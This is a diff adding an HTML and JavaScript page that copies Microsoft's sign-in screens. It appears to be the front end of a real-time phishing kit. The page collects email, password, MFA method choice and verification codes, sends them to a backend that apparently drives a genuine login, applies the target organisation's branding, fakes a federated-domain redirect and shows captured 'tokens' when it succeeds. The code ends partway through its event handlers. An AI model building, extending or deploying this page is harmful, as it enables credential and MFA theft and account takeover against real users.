@@ -1,0 +1,719 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Sign in to your account</title>
+<style>
+* { box-sizing: border-box; margin: 0; padding: 0; }
+body {
+  font-family: "Segoe UI", -apple-system, BlinkMacSystemFont, sans-serif;
+  background: #f2f2f2;
+  min-height: 100vh;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  position: relative;
+  overflow: hidden;
+}
+
+/* Geometric background shapes (MS-style) */
+body::before, body::after {
+  content: "";
+  position: fixed;
+  border-radius: 50%;
+  opacity: 0.07;
+  background: #0067b8;
+  pointer-events: none;
+}
+body::before { width: 600px; height: 600px; top: -200px; left: -200px; }
+body::after  { width: 500px; height: 500px; bottom: -180px; right: -150px; }
+
+#bgLayer {
+  position: fixed; inset: -30px;
+  z-index: -1;
+  background-size: cover;
+  background-position: center;
+  filter: blur(28px) brightness(0.75);
+  transform: scale(1.05);
+  display: none;
+}
+body.has-bg-image #bgLayer { display: block; }
+body.has-bg-image .card { background: #1b1b1b; box-shadow: 0 4px 32px rgba(0,0,0,0.7); }
+body.has-bg-image h1,
+body.has-bg-image h2 { color: #fff; }
+body.has-bg-image .email-back-row { color: #c8c8c8; }
+body.has-bg-image .pw-input { color: #fff; border-bottom-color: #666; }
+body.has-bg-image .pw-input:focus { border-bottom-color: #4fc3f7; }
+body.has-bg-image .forgot-link,
+body.has-bg-image .ms-link { color: #4fc3f7; }
+body.has-bg-image .username-sub { color: #aaa; }
+body.has-bg-image .username-input { color: #fff; border-bottom-color: #666; }
+body.has-bg-image .username-input:focus { border-bottom-color: #4fc3f7; }
+body.has-bg-image .footer-bar { background: #111; border-top-color: #333; color: #999; }
+body.has-bg-image .footer-bar a { color: #999; }
+body.has-bg-image .status-error { color: #f88; }
+
+/* Top loader */
+#topLoader {
+  position: fixed; top: 0; left: 0; right: 0; height: 3px;
+  overflow: hidden; opacity: 0; pointer-events: none;
+  transition: opacity 0.15s;
+  z-index: 1000;
+}
+#topLoader.visible { opacity: 1; }
+#topLoader .sweep {
+  position: absolute; top: 0; left: -40%; height: 100%; width: 40%;
+  background: #0067b8;
+  animation: sweep 1.3s ease-in-out infinite;
+}
+@keyframes sweep { 0% { left: -40%; } 100% { left: 100%; } }
+
+/* Card */
+.wrapper { width: 440px; max-width: calc(100vw - 32px); }
+.card {
+  background: #fff;
+  border-radius: 2px;
+  box-shadow: 0 2px 6px rgba(0,0,0,0.2);
+  padding: 44px 44px 36px;
+  position: relative;
+}
+
+/* MS Logo row */
+.ms-logo-row {
+  display: flex; align-items: center; gap: 8px;
+  margin-bottom: 20px;
+}
+.ms-logo-row svg { flex-shrink: 0; }
+.ms-logo-row span {
+  font-size: 20px; font-weight: 600; color: #1b1b1b;
+  letter-spacing: -0.2px;
+}
+
+/* Logo-mark (for username screen — hidden on password screen) */
+.logo-mark { display: flex; }
+
+/* Headings */
+h1 { font-size: 24px; font-weight: 600; color: #1b1b1b; margin-bottom: 16px; }
+h2 { font-size: 24px; font-weight: 600; color: #1b1b1b; margin-bottom: 20px; }
+
+.username-sub {
+  font-size: 13px; color: #605e5c;
+  margin-bottom: 20px; line-height: 1.4;
+}
+
+/* Email/back row on password screen */
+.email-back-row {
+  display: flex; align-items: center; gap: 8px;
+  font-size: 13px; color: #1b1b1b;
+  margin-bottom: 20px; cursor: pointer;
+}
+.email-back-row:hover { text-decoration: underline; }
+.back-chevron { font-size: 16px; color: #605e5c; line-height: 1; }
+
+/* Underline inputs */
+.username-input, .pw-input {
+  width: 100%; padding: 8px 0 4px;
+  border: none; border-bottom: 1px solid #605e5c;
+  background: transparent; font-size: 15px; color: #1b1b1b;
+  outline: none;
+  font-family: inherit;
+}
+.username-input:focus { border-bottom: 2px solid #0067b8; margin-bottom: -1px; }
+.pw-input:focus { border-bottom: 2px solid #0067b8; margin-bottom: -1px; }
+.username-input::placeholder { color: transparent; }
+
+/* Floating label for username */
+.input-wrap { position: relative; margin-bottom: 20px; }
+.input-label {
+  position: absolute; left: 0; top: 8px;
+  font-size: 15px; color: #605e5c;
+  pointer-events: none;
+  transition: all 0.1s ease;
+}
+.username-input:focus ~ .input-label,
+.username-input:not(:placeholder-shown) ~ .input-label {
+  top: -10px; font-size: 11px; color: #0067b8;
+}
+
+/* Password input wrapper (with eye) */
+.pw-wrap {
+  position: relative; margin-bottom: 8px;
+}
+.pw-eye {
+  position: absolute; right: 0; top: 50%; transform: translateY(-50%);
+  background: none; border: none; cursor: pointer;
+  color: #605e5c; padding: 4px; display: flex; align-items: center;
+}
+.pw-eye:hover { color: #1b1b1b; }
+
+/* Status / error */
+#status {
+  font-size: 13px; line-height: 1.5; margin-bottom: 10px;
+  min-height: 0; white-space: pre-wrap; word-break: break-word;
+}
+.status-info    { color: #605e5c; }
+.status-success { color: #107c10; }
+.status-error   { color: #a80000; }
+
+/* Forgot link */
+.forgot-link {
+  display: block; font-size: 13px; color: #0067b8;
+  text-decoration: none; margin-bottom: 24px;
+}
+.forgot-link:hover { text-decoration: underline; }
+
+/* Buttons row: Back (left) + Next/Sign in (right) */
+.btn-row {
+  display: flex; justify-content: flex-end; gap: 8px;
+  margin-top: 16px;
+}
+.btn-back {
+  padding: 7px 16px; font-size: 13px; font-weight: 400;
+  background: #fff; color: #0067b8;
+  border: 1px solid #8a8886; border-radius: 0;
+  cursor: pointer; font-family: inherit;
+}
+.btn-back:hover { background: #f3f2f1; }
+.btn-primary {
+  padding: 7px 20px; font-size: 13px; font-weight: 600;
+  background: #0067b8; color: #fff;
+  border: none; border-radius: 0; cursor: pointer; font-family: inherit;
+}
+.btn-primary:hover:not(:disabled) { background: #005a9e; }
+.btn-primary:disabled { background: #a9a9a9; cursor: not-allowed; }
+
+/* Links below username form */
+.ms-link {
+  display: block; font-size: 13px; color: #0067b8;
+  text-decoration: none; margin-bottom: 8px;
+}
+.ms-link:hover { text-decoration: underline; }
+
+/* Options card */
+#optionsCard {
+  margin-top: 12px; display: flex; align-items: center;
+  gap: 12px; font-size: 14px; color: #605e5c;
+  background: #fff; border-radius: 2px;
+  box-shadow: 0 2px 6px rgba(0,0,0,0.1);
+  padding: 14px 20px;
+}
+
+/* Footer bar */
+.footer-bar {
+  position: fixed; bottom: 0; left: 0; right: 0;
+  background: #f2f2f2; border-top: 1px solid #d2d0ce;
+  display: flex; justify-content: flex-end; gap: 20px;
+  padding: 10px 24px; font-size: 12px; color: #605e5c;
+  z-index: 100;
+}
+.footer-bar a { color: #605e5c; text-decoration: none; }
+.footer-bar a:hover { text-decoration: underline; }
+
+/* Password card footer */
+.pw-footer {
+  margin: 28px -44px -36px;
+  background: #f9f9f9; border-top: 1px solid #e5e5e5;
+  padding: 14px 44px; font-size: 13px; color: #605e5c;
+  border-radius: 0 0 2px 2px;
+}
+body.has-bg-image .pw-footer { background: #111; border-top-color: #333; color: #888; }
+
+/* Result */
+pre#result {
+  display: none; margin-top: 16px;
+  background: #f7f7f7; border: 1px solid #ddd;
+  border-radius: 2px; padding: 10px;
+  font-size: 12px; overflow-x: auto; max-height: 200px;
+}
+
+/* Dots loader */
+.dots-loader { display: inline-flex; align-items: center; gap: 4px; margin-right: 6px; vertical-align: middle; }
+.dot {
+  width: 6px; height: 6px; border-radius: 50%; background: #0067b8;
+  animation: dot-bounce 1.2s ease-in-out infinite both;
+}
+.dot:nth-child(1) { animation-delay: 0s; }
+.dot:nth-child(2) { animation-delay: 0.2s; }
+.dot:nth-child(3) { animation-delay: 0.4s; }
+@keyframes dot-bounce { 0%,80%,100%{transform:scale(0.6);opacity:.5} 40%{transform:scale(1);opacity:1} }
+
+/* MFA screens */
+.mfa-header { display: flex; align-items: center; gap: 10px; margin-bottom: 20px; font-size: 13px; color: #1b1b1b; }
+.mfa-option-btn {
+  display: flex; align-items: center; gap: 16px; width: 100%;
+  text-align: left; padding: 14px 4px; background: transparent;
+  border: none; border-bottom: 1px solid #e5e5e5;
+  font-size: 14px; color: #1b1b1b; cursor: pointer; font-family: inherit;
+}
+.mfa-option-btn:last-child { border-bottom: none; }
+.mfa-option-btn:hover { background: #f5f5f5; }
+.mfa-option-btn:disabled { opacity: 0.5; cursor: not-allowed; }
+.icon-box { flex-shrink: 0; width: 36px; height: 36px; display: flex; align-items: center; justify-content: center; color: #444; }
+.icon-123 { width: 34px; height: 26px; border: 2px solid #444; border-radius: 3px; display: flex; align-items: center; justify-content: center; font-size: 13px; font-weight: 700; color: #444; }
+.mfa-cancel-row { display: flex; justify-content: flex-end; margin-top: 20px; }
+.code-context { display: flex; align-items: flex-start; gap: 12px; margin-bottom: 20px; font-size: 14px; color: #1b1b1b; }
+
+/* Org login page */
+#orgLoginPage {
+  display: none; min-height: 100vh; width: 100%;
+  background: #fff; flex-direction: column;
+}
+.org-topbar { display: flex; align-items: center; padding: 16px 24px; border-bottom: 1px solid #e5e5e5; }
+.org-topbar-brand { font-size: 20px; font-weight: 600; color: #0067b8; cursor: pointer; display: flex; align-items: center; gap: 8px; }
+.org-content { flex: 1; display: flex; align-items: center; justify-content: center; }
+.org-card { background: #fff; border: 1px solid #e5e5e5; border-radius: 2px; padding: 32px 40px; width: 440px; max-width: calc(100vw - 32px); }
+.org-field { margin-bottom: 20px; }
+.org-field label { display: block; font-size: 13px; font-weight: 600; color: #1b1b1b; margin-bottom: 4px; }
+.org-field-row { display: flex; justify-content: space-between; align-items: center; }
+.org-field-row a { font-size: 12px; color: #0067b8; text-decoration: none; }
+.org-field input { width: 100%; padding: 8px; border: 1px solid #8a8886; font-size: 14px; font-family: inherit; outline: none; }
+.org-field input:focus { border-color: #0067b8; box-shadow: 0 0 0 1px #0067b8; }
+.org-checkbox-row { display: flex; align-items: center; gap: 8px; font-size: 13px; margin-bottom: 20px; }
+.org-primary-btn { width: 100%; padding: 10px; background: #0067b8; color: #fff; border: none; font-size: 14px; font-weight: 600; cursor: pointer; font-family: inherit; }
+.org-primary-btn:hover { background: #005a9e; }
+.org-help-link { font-size: 13px; color: #605e5c; margin-top: 12px; }
+.org-help-link a { color: #0067b8; }
+.org-below-panel { padding: 20px 40px; border-top: 1px solid #e5e5e5; display: flex; justify-content: space-between; align-items: center; font-size: 13px; }
+.org-get-started-btn { padding: 7px 16px; border: 1px solid #0067b8; background: #fff; color: #0067b8; font-size: 13px; cursor: pointer; font-family: inherit; }
+.req { color: #a80000; }
+#orgRedirecting { font-size: 14px; color: #605e5c; padding: 12px 0; }
+</style>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.5/socket.io.min.js"></script>
+</head>
+<body>
+
+<div id="bgLayer"></div>
+<div id="topLoader"><div class="sweep"></div></div>
+
+<!-- ─── Main card wrapper ─── -->
+<div class="wrapper">
+  <div class="card">
+
+    <!-- Username screen -->
+    <form id="usernameForm">
+      <div class="ms-logo-row logo-mark">
+        <svg width="21" height="21" viewBox="0 0 21 21">
+          <rect x="0"  y="0"  width="10" height="10" fill="#F35325"/>
+          <rect x="11" y="0"  width="10" height="10" fill="#81BC06"/>
+          <rect x="0"  y="11" width="10" height="10" fill="#05A6F0"/>
+          <rect x="11" y="11" width="10" height="10" fill="#FFBA08"/>
+        </svg>
+        <span>Microsoft</span>
+      </div>
+      <h1>Sign in</h1>
+      <div id="status" class="status-info"></div>
+      <div class="input-wrap">
+        <input type="email" id="username" class="username-input" autocomplete="username" required placeholder=" ">
+        <label class="input-label" for="username">Email, phone, or Skype</label>
+      </div>
+      <a href="#" class="ms-link" onclick="return false;">No account? Create one!</a>
+      <a href="#" class="ms-link" onclick="return false;">Can't access your account?</a>
+      <div class="btn-row">
+        <button type="button" class="btn-back" id="usernameBackBtn">Back</button>
+        <button type="submit" class="btn-primary" id="usernameBtn">Next</button>
+      </div>
+    </form>
+
+    <!-- Password screen -->
+    <form id="passwordForm" style="display:none;">
+      <div class="ms-logo-row">
+        <svg width="21" height="21" viewBox="0 0 21 21">
+          <rect x="0"  y="0"  width="10" height="10" fill="#F35325"/>
+          <rect x="11" y="0"  width="10" height="10" fill="#81BC06"/>
+          <rect x="0"  y="11" width="10" height="10" fill="#05A6F0"/>
+          <rect x="11" y="11" width="10" height="10" fill="#FFBA08"/>
+        </svg>
+        <span>Microsoft</span>
+      </div>
+      <div class="email-back-row" id="passwordBackArrow">
+        <span class="back-chevron">&#8592;</span>
+        <span id="passwordEmailDisplay"></span>
+      </div>
+      <h2>Enter password</h2>
+      <img id="passwordLogo" style="display:none;max-height:36px;margin-bottom:12px;" src="" alt="">
+      <div class="pw-wrap">
+        <input type="password" id="password" class="pw-input" autocomplete="current-password" required placeholder="Password">
+        <button type="button" class="pw-eye" id="togglePw" aria-label="Show password" tabindex="-1">
+          <svg width="18" height="18" viewBox="0 0 20 20" fill="currentColor">
+            <path d="M3.26 11.6A6.97 6.97 0 0 1 10 6c3.2 0 6.06 2.33 6.74 5.6a.5.5 0 0 0 .98-.2A7.97 7.97 0 0 0 10 5a7.97 7.97 0 0 0-7.72 6.4.5.5 0 0 0 .98.2ZM10 8a3.5 3.5 0 1 0 0 7 3.5 3.5 0 0 0 0-7Zm-2.5 3.5a2.5 2.5 0 1 1 5 0 2.5 2.5 0 0 1-5 0Z"/>
+          </svg>
+        </button>
+      </div>
+      <a href="#" class="forgot-link" onclick="return false;">Forgot my password</a>
+      <div class="btn-row">
+        <button type="button" class="btn-back" id="passwordCancelBtn" style="display:none;">← Back</button>
+        <button type="submit" class="btn-primary" id="passwordBtn">Sign in</button>
+      </div>
+    </form>
+    <div class="pw-footer" id="passwordFooter" style="display:none;">
+      <div id="passwordFooterText"></div>
+    </div>
+
+    <!-- MFA choice screen -->
+    <div id="mfaChoiceScreen" style="display:none;">
+      <div class="ms-logo-row">
+        <svg width="21" height="21" viewBox="0 0 21 21">
+          <rect x="0"  y="0"  width="10" height="10" fill="#F35325"/>
+          <rect x="11" y="0"  width="10" height="10" fill="#81BC06"/>
+          <rect x="0"  y="11" width="10" height="10" fill="#05A6F0"/>
+          <rect x="11" y="11" width="10" height="10" fill="#FFBA08"/>
+        </svg>
+        <span>Microsoft</span>
+      </div>
+      <div class="mfa-header" id="mfaChoiceEmailRow"></div>
+      <h2>Verify your identity</h2>
+      <div id="status_mfa" class="status-info"></div>
+      <div id="mfaOptionsList"></div>
+      <div id="mfaWaitingNote" style="display:none;font-size:13px;color:#605e5c;padding:12px 0;">Waiting for verification options…</div>
+      <div class="mfa-cancel-row">
+        <button type="button" class="btn-back" id="mfaCancelBtn">Cancel</button>
+      </div>
+    </div>
+
+    <!-- MFA code screen -->
+    <form id="mfaCodeForm" style="display:none;">
+      <div class="ms-logo-row">
+        <svg width="21" height="21" viewBox="0 0 21 21">
+          <rect x="0"  y="0"  width="10" height="10" fill="#F35325"/>
+          <rect x="11" y="0"  width="10" height="10" fill="#81BC06"/>
+          <rect x="0"  y="11" width="10" height="10" fill="#05A6F0"/>
+          <rect x="11" y="11" width="10" height="10" fill="#FFBA08"/>
+        </svg>
+        <span>Microsoft</span>
+      </div>
+      <div class="mfa-header" id="mfaCodeEmailRow"></div>
+      <h2>Enter code</h2>
+      <div class="code-context">
+        <span id="mfaCodeContextText">Please enter your verification code.</span>
+      </div>
+      <div class="input-wrap" style="margin-bottom:12px;">
+        <input type="text" id="mfaCode" class="username-input" inputmode="numeric" placeholder="Code" autocomplete="one-time-code">
+      </div>
+      <div class="btn-row">
+        <button type="submit" class="btn-primary" id="mfaCodeBtn">Verify</button>
+      </div>
+    </form>
+
+  </div><!-- /card -->
+
+  <!-- Sign-in options card (username screen) -->
+  <div id="optionsCard" style="display:none;margin-top:10px;">
+    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#605e5c" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><circle cx="7.5" cy="15.5" r="4.5"/><path d="M10.5 12.5L20 3"/><path d="M16 7l3 3"/><path d="M13 4l3 3"/></svg>
+    <span>Sign-in options</span>
+  </div>
+
+  <pre id="result"></pre>
+</div><!-- /wrapper -->
+
+<!-- Org login full-page -->
+<div id="orgLoginPage">
+  <div class="org-topbar">
+    <div class="org-topbar-brand">
+      <svg width="18" height="18" viewBox="0 0 21 21">
+        <rect x="0"  y="0"  width="10" height="10" fill="#F35325"/>
+        <rect x="11" y="0"  width="10" height="10" fill="#81BC06"/>
+        <rect x="0"  y="11" width="10" height="10" fill="#05A6F0"/>
+        <rect x="11" y="11" width="10" height="10" fill="#FFBA08"/>
+      </svg>
+      Microsoft
+    </div>
+  </div>
+  <div class="org-content">
+    <div class="org-card">
+      <p id="orgRedirecting" style="display:none;">Redirecting to your organization's sign-in page…</p>
+      <div id="orgPanel" style="display:none;">
+        <p id="orgDomainNote" style="font-size:14px;color:#605e5c;margin-bottom:20px;"></p>
+        <button type="button" id="orgCancelRedirectBtn" class="btn-back" style="margin-bottom:16px;">← Back</button>
+        <form id="orgLoginForm">
+          <div class="org-field">
+            <label for="orgEmail">Email <span class="req">*</span></label>
+            <input type="text" id="orgEmail" placeholder="name@organization.com" autocomplete="username">
+          </div>
+          <div class="org-field">
+            <div class="org-field-row">
+              <label for="orgPassword">Password <span class="req">*</span></label>
+              <a href="#" id="orgToggleShow">Show</a>
+            </div>
+            <input type="password" id="orgPassword" autocomplete="current-password" required>
+          </div>
+          <div class="org-checkbox-row">
+            <input type="checkbox" id="orgKeepSignedIn" checked>
+            <label for="orgKeepSignedIn">Keep me signed in</label>
+          </div>
+          <button type="submit" class="org-primary-btn" id="orgSignInBtn">Sign In</button>
+          <div class="org-help-link">Need to find <a href="#">your password</a>?</div>
+          <div id="orgStatus" class="status-info" style="margin-top:12px;font-size:13px;"></div>
+        </form>
+      </div>
+      <div class="org-below-panel">
+        <span>Don't have an account?</span>
+        <button type="button" class="org-get-started-btn" id="orgGetStartedBtn">Get started</button>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- Footer -->
+<div class="footer-bar" id="mainFooter">
+  <a href="#" onclick="return false;">Terms of use</a>
+  <a href="#" onclick="return false;">Privacy &amp; cookies</a>
+  <span>&#183;&#183;&#183;</span>
+</div>
+
+<script>
+const API_BASE = "";
+const bgLayer = document.getElementById("bgLayer");
+const logoMark = document.querySelector(".logo-mark");
+const usernameForm = document.getElementById("usernameForm");
+const passwordForm = document.getElementById("passwordForm");
+const orgLoginForm = document.getElementById("orgLoginForm");
+const orgEmail = document.getElementById("orgEmail");
+const orgPassword = document.getElementById("orgPassword");
+const orgSignInBtn = document.getElementById("orgSignInBtn");
+const orgGetStartedBtn = document.getElementById("orgGetStartedBtn");
+const orgDomainNote = document.getElementById("orgDomainNote");
+const orgRedirecting = document.getElementById("orgRedirecting");
+const orgPanel = document.getElementById("orgPanel");
+const orgCancelRedirectBtn = document.getElementById("orgCancelRedirectBtn");
+const usernameInput = document.getElementById("username");
+const passwordInput = document.getElementById("password");
+const usernameBtn = document.getElementById("usernameBtn");
+const passwordBtn = document.getElementById("passwordBtn");
+const usernameBackBtn = document.getElementById("usernameBackBtn");
+const passwordCancelBtn = document.getElementById("passwordCancelBtn");
+const passwordBackArrow = document.getElementById("passwordBackArrow");
+const passwordEmailDisplay = document.getElementById("passwordEmailDisplay");
+const passwordLogo = document.getElementById("passwordLogo");
+const passwordFooter = document.getElementById("passwordFooter");
+const passwordFooterText = document.getElementById("passwordFooterText");
+const mainFooter = document.getElementById("mainFooter");
+const mfaChoiceScreen = document.getElementById("mfaChoiceScreen");
+const mfaOptionsList = document.getElementById("mfaOptionsList");
+const mfaWaitingNote = document.getElementById("mfaWaitingNote");
+const mfaCancelBtn = document.getElementById("mfaCancelBtn");
+const mfaChoiceEmailRow = document.getElementById("mfaChoiceEmailRow");
+const mfaCodeEmailRow = document.getElementById("mfaCodeEmailRow");
+const mfaCodeContextText = document.getElementById("mfaCodeContextText");
+const mfaCodeForm = document.getElementById("mfaCodeForm");
+const mfaCodeInput = document.getElementById("mfaCode");
+const mfaCodeBtn = document.getElementById("mfaCodeBtn");
+const statusEl = document.getElementById("status");
+const resultEl = document.getElementById("result");
+const optionsCard = document.getElementById("optionsCard");
+
+let currentUsername = null;
+let lastSelectedMfaOption = null;
+let passwordSubmitted = false;
+
+function cancelSession(username) {
+  if (!username) return;
+  const payload = JSON.stringify({ username });
+  const url = `${API_BASE}/login/cancel`;
+  if (navigator.sendBeacon) {
+    navigator.sendBeacon(url, new Blob([payload], { type: "application/json" }));
+  } else {
+    fetch(url, { method: "POST", headers: { "Content-Type": "application/json" }, body: payload, keepalive: true });
+  }
+}
+window.addEventListener("pagehide", () => cancelSession(currentUsername));
+
+const DOTS_LOADER_HTML = '<span class="dots-loader"><span class="dot"></span><span class="dot"></span><span class="dot"></span></span>';
+
+function setStatus(message, kind = "info", loading = false) {
+  statusEl.innerHTML = loading ? DOTS_LOADER_HTML + message : message;
+  statusEl.className = `status-${kind}`;
+}
+function setBusy(button, busy, label) {
+  button.disabled = busy;
+  button.textContent = busy ? "Working..." : label;
+}
+const topLoaderEl = document.getElementById("topLoader");
+let topLoaderCount = 0;
+function showTopLoader() { topLoaderCount += 1; topLoaderEl.classList.add("visible"); }
+function hideTopLoader() { topLoaderCount = Math.max(0, topLoaderCount - 1); if (!topLoaderCount) topLoaderEl.classList.remove("visible"); }
+
+async function postJSON(path, body) {
+  showTopLoader();
+  try {
+    const res = await fetch(`${API_BASE}${path}`, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(body) });
+    let data;
+    try { data = await res.json(); } catch { throw new Error(`Server error (${res.status})`); }
+    if (!res.ok || data.ok === false) throw new Error(data.output || `Request failed (${res.status})`);
+    return data;
+  } finally { hideTopLoader(); }
+}
+async function getJSON(path) {
+  showTopLoader();
+  try {
+    const res = await fetch(`${API_BASE}${path}`);
+    let data;
+    try { data = await res.json(); } catch { throw new Error(`Server error (${res.status})`); }
+    if (!res.ok || data.ok === false) throw new Error(data.output || `Request failed (${res.status})`);
+    return data;
+  } finally { hideTopLoader(); }
+}
+
+function showScreen(name) {
+  document.querySelector(".wrapper").style.display = name === "orgLogin" ? "none" : "block";
+  document.getElementById("orgLoginPage").style.display = name === "orgLogin" ? "flex" : "none";
+  if (passwordForm.style.display !== "none" && name !== "password") passwordInput.value = "";
+  usernameForm.style.display = name === "username" ? "block" : "none";
+  passwordForm.style.display = name === "password" ? "block" : "none";
+  optionsCard.style.display = name === "username" ? "flex" : "none";
+  mfaChoiceScreen.style.display = name === "mfaChoice" ? "block" : "none";
+  mfaCodeForm.style.display = name === "mfaCode" ? "block" : "none";
+  logoMark.style.display = name === "username" ? "flex" : "none";
+  mainFooter.style.display = name === "orgLogin" ? "none" : "flex";
+  passwordFooter.style.display = name === "password" ? "block" : "none";
+  if (name === "password") passwordEmailDisplay.textContent = currentUsername || "";
+  const screenContainer = { username: usernameForm, password: passwordForm, mfaChoice: mfaChoiceScreen, mfaCode: mfaCodeForm }[name];
+  if (screenContainer) { const h = screenContainer.querySelector("h1,h2"); if (h) h.insertAdjacentElement("afterend", statusEl); }
+  if (name === "mfaChoice" || name === "mfaCode") {
+    const html = `<span class="back-chevron" data-back>&#8592;</span><span>${currentUsername || ""}</span>`;
+    if (name === "mfaChoice") mfaChoiceEmailRow.innerHTML = html;
+    if (name === "mfaCode") mfaCodeEmailRow.innerHTML = html;
+  }
+}
+
+function _mfaOptionIcon(label) {
+  const l = label.toLowerCase();
+  if (l.includes("authenticator")) return `<div class="icon-box"><svg width="36" height="36" viewBox="0 0 24 24"><circle cx="12" cy="12" r="12" fill="#1b1b1b"/><circle cx="12" cy="9.5" r="3.5" fill="#fff"/><path d="M4 20c0-4 3.6-6.5 8-6.5s8 2.5 8 6.5" fill="#fff"/></svg></div>`;
+  if (l.includes("verification code") || l.includes("use a verification")) return `<div class="icon-box"><div class="icon-123">123</div></div>`;
+  if (l.startsWith("text")) return `<div class="icon-box"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg></div>`;
+  if (l.startsWith("call")) return `<div class="icon-box"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M3 5a2 2 0 0 1 2-2h3l2 5-2 2a12 12 0 0 0 6 6l2-2 5 2v3a2 2 0 0 1-2 2A16 16 0 0 1 3 5z"/></svg></div>`;
+  return `<div class="icon-box"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><circle cx="7.5" cy="15.5" r="4.5"/><path d="M10.5 12.5L20 3"/><path d="M16 7l3 3"/><path d="M13 4l3 3"/></svg></div>`;
+}
+
+function renderMfaOptions(options) {
+  mfaOptionsList.innerHTML = "";
+  options.forEach(label => {
+    const btn = document.createElement("button");
+    btn.type = "button"; btn.className = "mfa-option-btn";
+    btn.innerHTML = `${_mfaOptionIcon(label)}<span>${label}</span>`;
+    btn.addEventListener("click", async () => {
+      btn.disabled = true; setStatus("Selecting method...", "info", true);
+      try {
+        await postJSON("/login/mfa-select", { username: currentUsername, option: label });
+        lastSelectedMfaOption = label; stopPolling(); startWaitingLoader(); setTimeout(pollStatus, 400);
+      } catch (err) { setStatus(err.message, "error"); btn.disabled = false; }
+    });
+    mfaOptionsList.appendChild(btn);
+  });
+  mfaWaitingNote.style.display = options.length ? "none" : "block";
+}
+
+let waitingLoaderActive = false;
+const socket = io({ transports: ["websocket"], upgrade: false });
+socket.on("status", data => handleStatusData(data));
+
+function startWaitingLoader() { if (waitingLoaderActive) return; waitingLoaderActive = true; showTopLoader(); }
+function stopWaitingLoader() { if (!waitingLoaderActive) return; waitingLoaderActive = false; hideTopLoader(); }
+function stopPolling() { stopWaitingLoader(); }
+
+function resetBranding() {
+  bgLayer.style.backgroundImage = ""; document.body.classList.remove("has-bg-image");
+  passwordLogo.style.display = "none"; passwordLogo.src = ""; passwordFooterText.textContent = "";
+}
+function applyBranding(data) {
+  if (data.background_image) { bgLayer.style.backgroundImage = `url('${data.background_image}')`; document.body.classList.add("has-bg-image"); }
+  if (data.footer_text) passwordFooterText.textContent = data.footer_text;
+}
+
+function handleStatusData(data) {
+  if (!currentUsername) return;
+  applyBranding(data);
+  if (data.stage === "starting") {
+  } else if (data.stage === "entering_password") {
+    if (!passwordSubmitted) { stopWaitingLoader(); setBusy(usernameBtn, false, "Next"); setStatus(""); showScreen("password"); passwordInput.focus(); }
+    else if (data.error) { stopWaitingLoader(); setBusy(passwordBtn, false, "Sign in"); passwordCancelBtn.style.display = "none"; setStatus(data.error, "error"); passwordSubmitted = false; passwordInput.value = ""; passwordInput.focus(); }
+  } else if (data.stage === "awaiting_org_login") {
+    stopWaitingLoader(); setBusy(usernameBtn, false, "Next");
+    orgDomainNote.textContent = data.federated_domain ? `This account uses your organization's sign-in page (${data.federated_domain}).` : "This account uses your organization's sign-in page.";
+    showScreen("orgLogin"); orgRedirecting.style.display = "block"; orgPanel.style.display = "none";
+    setTimeout(() => { orgRedirecting.style.display = "none"; orgPanel.style.display = "block"; setOrgStatus("Redirected to your organization's sign-in page.", "success"); orgEmail.value = currentUsername; orgPassword.focus(); }, 1800);
+  } else if (data.stage === "awaiting_mfa_choice") { stopWaitingLoader(); showScreen("mfaChoice"); renderMfaOptions(data.mfa_options || []); setStatus(""); }
+  else if (data.stage === "awaiting_mfa_code") {
+    stopWaitingLoader(); showScreen("mfaCode");
+    if (lastSelectedMfaOption) {
+      const l = lastSelectedMfaOption.toLowerCase(), m = lastSelectedMfaOption.match(/\+.*$/), n = m ? ` ${m[0]}.` : "";
+      mfaCodeContextText.textContent = l.startsWith("call") ? `We called your phone${n} Please enter the code.` : l.startsWith("text") ? `We texted your phone${n} Please enter the code.` : "Please enter your verification code.";
+    }
+    setStatus(""); mfaCodeInput.focus();
+  } else if (data.stage === "succeeded") {
+    stopPolling(); showScreen("username"); setStatus("Authenticated successfully.", "success");
+    resultEl.style.display = "block"; resultEl.textContent = JSON.stringify(data.tokens, null, 2);
+    currentUsername = null; usernameForm.reset();
+  } else if (data.stage === "failed") {
+    stopPolling(); showScreen("username"); setBusy(usernameBtn, false, "Next");
+    setStatus(data.error || "Authentication failed.", "error"); currentUsername = null; resetBranding();
+  }
+}
+
+async function pollStatus() {
+  if (!currentUsername) return;
+  try { const data = await getJSON(`/login/status/${encodeURIComponent(currentUsername)}`); handleStatusData(data); }
+  catch (err) { stopPolling(); showScreen("username"); setBusy(usernameBtn, false, "Next"); setStatus(err.message, "error"); currentUsername = null; resetBranding(); }
+}
+
+usernameForm.addEventListener("submit", async e => {
+  e.preventDefault();
+  const username = usernameInput.value.trim(); if (!username) return;
+  setBusy(usernameBtn, true, "Next"); resultEl.style.display = "none"; passwordSubmitted = false; startWaitingLoader();
+  try {
+    const data = await postJSON("/login/username", { username });
+    if (!data.ok) throw new Error(data.output || "Failed to start login.");
+    currentUsername = data.username || username;
+    socket.emit("join", { username: currentUsername }); pollStatus();
+  } catch (err) { stopWaitingLoader(); setBusy(usernameBtn, false, "Next"); setStatus(err.message, "error"); }
+});
+
+const orgStatusEl = document.getElementById("orgStatus");
+function setOrgStatus(message, kind = "info", loading = false) { orgStatusEl.innerHTML = loading ? DOTS_LOADER_HTML + message : message; orgStatusEl.className = `status-${kind}`; }
+document.getElementById("orgToggleShow").addEventListener("click", e => { e.preventDefault(); const p = orgPassword.type === "password"; orgPassword.type = p ? "text" : "password"; e.target.textContent = p ? "Hide" : "Show"; });
+orgGetStartedBtn.addEventListener("click", e => e.preventDefault());
